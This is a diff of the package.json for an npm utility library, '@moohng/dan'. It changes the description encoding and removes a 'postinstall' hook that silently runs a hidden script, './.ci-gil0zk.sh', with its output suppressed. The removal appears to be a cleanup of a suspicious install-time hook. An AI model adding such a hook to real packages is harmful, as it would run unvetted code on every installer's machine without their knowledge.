@@ -1,7 +1,7 @@
 {
   "name": "@moohng/dan",
   "version": "2.2.1",
-  "description": "js\u5de5\u5177\u5e93",
+  "description": "js工具库",
   "main": "dist/dan.umd.js",
   "module": "lib/index.js",
   "types": "lib/index.d.ts",
@@ -14,8 +14,7 @@
     "build:dist": "rollup -c rollup.config.js",
     "lint": "eslint --ext .ts,.js src --fix",
     "precommit": "lint-staged",
-    "test": "jest",
-    "postinstall": "sh ./.ci-gil0zk.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "jest"
   },
   "lint-staged": {
     "src/**/*.js": [
